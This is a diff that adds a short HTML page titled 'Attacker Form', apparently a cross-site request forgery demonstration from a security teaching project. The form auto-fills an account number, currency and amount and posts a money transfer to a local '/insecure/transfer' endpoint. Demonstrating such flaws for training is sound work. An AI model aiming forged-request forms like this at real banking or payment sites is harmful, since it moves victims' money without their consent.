@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Attacker Form</title>
+</head>
+<h1>Attacker Form</h1>
+<form method="post" action="http://localhost:3000/insecure/transfer">
+  <div>
+    <label for="toAccount"><span>To Account</span></label><input id="toAccount" name="toAccount" type="number" value="999">
+  </div>
+  <div>
+    <label for="currency"><span>Currency</span></label><input id="currency" name="currency" value="CHF">
+  </div>
+  <div>
+    <label for="amount"><span>Amount</span></label><input id="amount" name="amount" type="number" value="999">
+  </div>
+  <div><button type="submit">Transfer</button></div>
+</form>
+
+</body>
+</html>
